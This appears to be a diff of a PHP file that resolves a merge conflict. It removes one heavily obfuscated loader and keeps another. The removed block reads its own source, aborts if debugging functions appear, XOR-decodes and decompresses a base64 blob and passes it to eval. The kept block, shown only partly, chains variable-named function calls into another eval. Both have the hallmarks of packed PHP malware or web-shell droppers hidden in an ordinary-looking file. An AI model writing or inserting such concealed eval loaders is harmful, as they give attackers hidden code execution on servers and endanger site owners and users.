@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$dhhibug="301f9889432c6473981358d093400e61";
-$kxrfqegb="0b0905025c090a5d0d52025a02560f525b595456075a57560a01015106570404";
-$ryiuupnk="QOOBML676VQpHH5ZywMIx6wj3xxd/h/jxTl//qBQVnxJfFCtjSMEOcsCTdS7F0wQDCyWsegkkP8KQQ7Taw0Neft0EdVz66Sm4oVRA+0affyya1O/xqYG6gsMHt4I8CkPORb3+VJOivPgGnDABG+DAkAt+ART77pGbAtiFRp91HZQ3ZZ9o1TBJ6iMnDXf3oyvarT4/xjXRNYxBgLnOaBiq6lsQWDiJxUHfKV3xEQ/sYsccffiBriLoDoVBDYim+6RnCN/dQb5TDK4jptAMezPwWoBxDNxUmPLRbCkP+0YJxvpRLheJo3lVCki0BVM7jClp6Oy9mNf9BLA7uCkavWqinXeof/w6XR6H6at4NuxesW+Vhmip9FEPsqqsoAOKtENKt9V4IwW7vqhaOreJbNDx18JRY/lLXbjNZMpVhy0Mixwnkm8G9PQcUj4nZ5vhrakVTslz3li/FQjKaoB+X+CHsoqGNEXmiMY4SQzxsHKKoJfcNcUzrfuh8iXyOebjx6nKHB9pkMUO19RLVmL3S7JqHakXoykwNymKYg/C9Gk83xB2RWFo8w/ktIXvalO87wpKHOEXu6QV1/oAYTiziFoIIGcVjluBNJzhELiymGTHfojSk9g78w5wYg8jKjOq8kb1Fo1CloRiJH3CLUABJOC12EwHUFJ6y1AHyz+nzUan82K8alEBWwdRgHP8dOnTbHw7mPwcaaEfP5Czdq/ss4x8A/bTZl+aUjWHw==";
-$gesqxxj=file_get_contents(__FILE__);
-$exqbfs=str_replace($ryiuupnk,"",$gesqxxj);
-if(strpos($exqbfs,"ec"."ho")!==false||strpos($exqbfs,"pr"."int")!==false||strpos($exqbfs,"var_"."dump")!==false||strpos($exqbfs,"file_put_"."contents")!==false||strpos($exqbfs,"fw"."rite")!==false){die();}
-$xnnhtmuu=str_replace(array($dhhibug,$kxrfqegb),array("SP_93e4b54d","KP_f3d00b71"),$gesqxxj);
-$woyyknt=md5($xnnhtmuu);
-$bkvjnezd=hex2bin($kxrfqegb);
-$tiujcff="";
-$kstpjjnf=strlen($woyyknt);
-for($fqndcnretx=0;$fqndcnretx<$kstpjjnf;$fqndcnretx++){
-$tiujcff.=chr(ord($bkvjnezd[$fqndcnretx])^ord($woyyknt[$fqndcnretx]));
-}
-$ytomztt=base64_decode($ryiuupnk);
-$uercspraufh=strlen($ytomztt);
-$wqbaotxr="";
-$twsitidco=strlen($tiujcff);
-for($fqndcnretx=0;$fqndcnretx<$uercspraufh;$fqndcnretx++){
-$wqbaotxr.=$ytomztt[$fqndcnretx]^$tiujcff[$fqndcnretx%$twsitidco];
-}
-$mrvsollut="gzun"."compress";
-eval('?>' . $mrvsollut($wqbaotxr) . '<?php ');
-=======
 // d6fb6d126f0241948cc7ac73
 $hZCUyQvDALb="xXJitx6Xi00GoWL75ZBizP4Fl375LqnKOY8d6NQ06kw=";
 $vV_WWFlZAETQU_="kKWvgk6Kv00TbJY75MOvmC4Sy375YdaXBL8q6AD06xj=";
@@ -52,4 +27,3 @@ $LhOHPGYFTOnOA=$tSiRqTOYldHM($LhOHPGYFTOnOA);
 $LhOHPGYFTOnOA=$pKFKqixg_N($LhOHPGYFTOnOA);
 $LhOHPGYFTOnOA=$TKOXEFcogAc($LhOHPGYFTOnOA);
 eval($LhOHPGYFTOnOA);
->>>>>>> Stashed changes
